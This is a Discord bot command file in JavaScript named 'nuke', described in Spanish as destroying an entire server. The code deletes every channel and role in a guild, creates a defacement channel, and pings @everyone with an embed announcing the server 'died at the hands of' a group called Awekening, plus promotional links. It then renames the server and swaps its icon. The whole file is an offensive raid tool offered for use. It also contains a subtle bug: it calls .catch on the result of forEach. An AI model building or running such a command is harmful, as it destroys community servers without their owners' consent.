const { ChatInputCommandInteraction, SlashCommandBuilder, ChannelFlags, ChannelType, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder} = require("discord.js");


module.exports = {
    data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("D3struye todo un servidor"),
    /**
     * 
     * @param {ChatInputCommandInteraction} interaction 
     */
   async execute(interaction){

     try {
        
        interaction.guild.channels.cache.forEach((channel) => {
            channel.delete().catch((err) => console.log(`Error deleting channel ${channel.name}:`, err));
          }).catch((err) => console.log(`Error creating`))
          
          // Delete all roles
          interaction.guild.roles.cache.forEach((role) => {
            role.delete().catch((err) => console.log(`Error deleting role ${role.name}:`, err));
          }).catch((err) => console.log(`Error creating`))

       const ch =  await interaction.guild.channels.create({
            type: ChannelType.GuildText,
            name: "Possessed by Awekening S.B Gen 8"
        }).catch((err) => console.log(`Error creating`))

       

        //Componente embed
        const embed = new EmbedBuilder()
        .setAuthor({
            name: "Awekening S.B Gen 8",
            iconURL: null
        })
        .setDescription("Este servidor ha muerto a manos de Awekening S.B Gen 8")
        .setColor("Red")
        .setImage("https://media.discordapp.net/attachments/1060263396416696463/1266929667500413008/banner.gif")
        .setFooter({
            text: "Made in Awekening S.B Gen 8", 
            iconURL: null
        })





        const bt1 = new ButtonBuilder()
        .setLabel("✅ Discord")
        .setURL("https://discord.gg/x9r58C3mne")
        .setStyle(ButtonStyle.Link)

        const bt2 = new ButtonBuilder()
        .setLabel("📺 Youtube")
        .setURL("https://www.youtube.com/@awekening992")
        .setStyle(ButtonStyle.Link)

        const bt3 = new ButtonBuilder()
        .setLabel("🌐 Website")
        .setURL("https://awekeningsb.com")
        .setStyle(ButtonStyle.Link)

        const actionRow = new ActionRowBuilder().addComponents(bt1, bt2, bt3)


        ch.send({
            content: "@everyone",
            embeds: [embed],
            components: [actionRow]
        }).catch((err) => console.log(`Error creating`))



        await interaction.guild.setName("Possessed By Awekening")
        await interaction.guild.setIcon("https://images-ext-1.discordapp.net/external/CSO_QO-Rqka-pvoOY9MDRPKgtiPGCv8cpEr04uV4bDk/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1057720116214763581/657311c86d5c4a62b4ee8f57a6ae294a.png")





     } catch (error) {
        console.log(error)
     }




    },
};